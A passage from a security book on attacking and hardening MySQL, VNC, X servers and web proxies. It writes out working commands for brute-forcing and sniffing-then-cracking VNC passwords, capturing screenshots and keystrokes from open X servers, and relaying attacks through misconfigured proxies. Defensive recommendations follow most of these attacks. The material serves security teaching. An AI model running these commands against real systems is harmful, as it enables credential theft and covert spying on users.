
## Remote Services

![](img/1b84de2bb5e7ca74dd76d8f9ae35b93d_151_0.png)

**Figure 4-1.** Ethereal can be used to capture MySQL sessions.

Using a network analyzer such as Ettercap or Ethereal. Ethereal can be downloaded from http://www.ethereal.com/.

### Block and Harden MySQL

If you run MySQL servers on your hosts, please consider the following recommendations:

- Configure your firewall to block incoming connections to your MySQL server. In most cases, only local MySQL access is required.
- Harden your MySQL configuration to not accept connections from remote users. See http://www.mysql.com/documentation/mysql/bychapter/manual_MySQL_Database_Administration.html#Privilege_system for detailed instructions.

### VNC (Virtual Network Computing): 5800+, 5900+ (TCP)

VNC is a remote-control software package that allows someone to access the desktop of a remote host. VNC is freeware and can be downloaded from http://www.realvnc.com/.

**Brute-Forcing** VNC instances require only a password in order to authenticate. Therefore, VNC accounts can be remotely brute-forced.

#### Brute-Force VNC

It is possible to attempt a brute-force attack on VNC using the `vncrack` tool available at http://www.phoenixit.de/vncrack/.

```bash
$ vncrack -h 10.0.0.1 -w passwords.txt
```

VNCrack – by PhoenixIT (http://www.phoenixit.de/)

$Revision: 1.17 $

```text
>>>>>>>>>>>>> >>
Password: test123
```

Additionally, it is possible to brute-force a VNC user's `~/.vnc/passwd` file that contains a VNC password hash:

```bash
$ vncrack -c ~/.vnc/passwd
VNC password: test123
```

#### Prevent VNC Brute-Forcing

Please see “Common Defenses Against Brute-Force Attacks.”

**Sniffing** It is possible to sniff VNC password hashes being transmitted over a network. Once a password hash has been obtained, it must be brute-force cracked in order to reveal the real password.

#### Sniff and Crack VNC Passwords

Use Ettercap to obtain the server challenge and client response hashes:

```bash
$ ettercap -C -m -R

ettercap 0.6.9 (c) 2002 ALoR & NaGA

Your IP: 192.168.1.1 with MAC: 00:30:23:C1:00:00 on iface: eth0

Loading plugins... Done.
Building host list for netmask 255.255.255.0, please wait...

Resolving 1 hostnames...

^ |====================================================================| 100.00 %

Press 'h' for help...

Sniffing (MAC based): ANY <--> ANY

TCP + UDP packets... (default)

Collecting passwords...

10:04:28 192.168.1.1:6612 <--> 10.0.0.1:5901 VNC
```

```text
USER:  On display :0
PASS:
Server Challenge: 612b8f9e6dfe71ba27abff77ff99c106 Client 3DES:
4e2568a12e5e7825addbdff4d5190fd6
```

Now, use the `vncrack` tool discussed previously to crack the obtained hash:

```bash
$ vncrack -v -c 612b8f9e6dfe71ba27abff77ff99c106 -r 4e2568a12e5e7825addbdff4d5190fd6 -w passwords.txt
vncrack - by PhoenixIT (http://www.phoenixit.de/) $Revision: 1.17 $
Challenge: 612b8f9e6dfe71ba27abff77ff99c106
Response : 4e2568a12e5e7825addbdff4d5190fd6

>>>>>>>>>>>>>>>>
Password: test123
```

Active traffic between the VNC viewer and the VNC server is unencrypted and can be sniffed by someone on a network segment. However, at this time, no known tools exist that enable deciphering active VNC traffic being transmitted across a network.

#### Tunnel VNC Traffic Securely via SSH

Use SSH to tunnel VNC traffic securely. Please see http://www.uk.research.att.com/vnc/sshvnc.html for details.

**VNC Misconfigurations** It is possible to set a null password for VNC authentication. Many users choose to set null passwords, and this allows an intruder to gain complete control of their desktop.

**Software Vulnerabilities** VNC software has been known to suffer a few vulnerabilities. What follows is a list of some of a few recently announced vulnerabilities.

- **TightVNC Server Authentication Cookie Predictability Vulnerability** The `vncserver` program is itself a PERL script that is responsible for generating random X server authentication cookies. A vulnerability was found in TightVNC's `vncserver` implementation that caused it to generate predictable authentication cookies. This condition caused the possibility for an attacker to predict the necessary response required to authenticate with the remote VNC server. See http://securityfocus.com/bid/6905 for details.
- **TightVNC Repeated Challenge Replay Attack Vulnerability** The VNC authentication mechanism uses a challenge-response scheme in order to successfully authenticate a user. This causes different password hashes to be sent by the VNC client every time a user authenticates. A vulnerability found in TightVNC’s software caused for similar challenge-responses to be requested by the VNC server. This enabled a malicious user on a network segment to reuse a previously gained password hash to authenticate as another user. More information is available at http://securityfocus.com/bid/5296.

### X: 6000 to 6063 (TCP)

The X window system is a network-transparent window system used on various operating systems. It is most commonly used to provide a graphical front end to Unix and Linux operating systems.

**X Misconfigurations** The xhost program is used to add and delete host-names to the list of hosts allowed to make connections to an X server. This provides rudimentary privacy control and security.

#### Abuse Misconfigured X Servers

Consider a user on 10.0.0.1 using xhost to allow connections from 192.168.1.3:

```bash
$ xhost +192.168.1.3
192.168.1.3 being added to access control list
```

Now, any user with an account on 192.168.1.3 may launch an X program and have it display on the X server running on 10.0.0.1. However, the following command will cause an X server to allow any host to connect to it:

```bash
$ xhost +
access control disabled, clients can connect from any host.
```

Consider a malicious user on 192.168.1.3 issuing the following command:

```bash
xwd -display 10.0.0.1:0 -root > screenshot.xwd
```

This command will create an image file called screenshot.xwd that will contain a screenshot of the 10.0.0.1 user’s X session (see Figure 4-2). The xwdc command can be used to view the screenshot.xwd file:

```bash
xwdc -in screenshot.xwd
```

![](img/1b84de2bb5e7ca74dd76d8f9ae35b93d_155_0.png)

**Figure 4-2.** Victim’s X session as captured by the xwd tool

The `xscan` command can be used to log keystrokes of a remote host that has issued the `xhost` command:

```bash
$ xscan 10.0.0.1
Scanning hostname 10.0.0.1 ...
Connecting to 10.0.0.1 (10.0.0.1) on port 6000...
Connected.
Host 10.0.0.1 is running X.
Starting keyboard logging of host 10.0.0.1:0.0 to file
KEYLOG10.0.0.1:0.0...
```

This `xscan` command will cause all keystrokes of the user on 10.0.0.1 to be logged to the file `KEYLOG10.0.0.1.0`. You can obtain `xscan` from http://packetstormsecurity.org/.

Many other tools are available that enable malicious users to take advantage of a user having issued an `xhost` command to allow connections from other hosts. Following is a list of a few such tools:

- `xwatchwin` Displays any window of the remote user’s X session in real time. The **xwatchwin** tool is available for download at http://packetstormsecurity.org/.
- `xremote` Allows you to send mouse and keyboard events to a remote X session. This tool can be downloaded from http://www.infa.abo.fi/~chakie/xremote/.
- `xkey` Logs keystrokes of a remote user’s X session, similar to xscan. It is available at http://packetcats.com/security/.

#### Block and Tunnel X

The following recommendations are suggested for those running X servers:

- Block ports 6000 to 6063 at your firewall. This will disable external hosts from connecting to internal X servers.
- Use SSH to tunnel X traffic securely:
  `ssh -X username@remotexserver.somecompanyasanexample.com`

### Web Proxies: 8000+ TCP

Web proxies, as their name suggests, are used to proxy HTTP and HTTPS traffic.

**Web Proxies Misconfigurations** Web proxy misconfigurations can be abused using the methods described here. We will make use of the desproxy command-line tool, which uses the CONNECT method supported by HTTP/1.1 to establish TCP connections via web proxies. It can be downloaded from http://desproxy.sourceforge.net/.

#### Proxy Attacks

Misconfigured web proxies often allow intruders to proxy attacks. Consider the following desproxy command:

```bash
desproxy 10.0.0.1 23 192.168.1.1 8000 2300
```

After issuing this command, if the intruder telnets to port 2300 on his or her own host (127.0.0.1), he or she will be connected to the telnet port (23) of 10.0.0.1 via the vulnerable web proxy (192.168.1.1) listening on port 8000. Since the victim host will log only incoming connections from the web proxy IP address of 192.168.1.1, the attacker would have successfully abused the web proxy in order to proxy his or her attacks.

> If an intruder already has control of a host on an internal network that does not allow outbound TCP connections, the intruder can use desproxy to establish TCP connections on external hosts via an available web proxy.
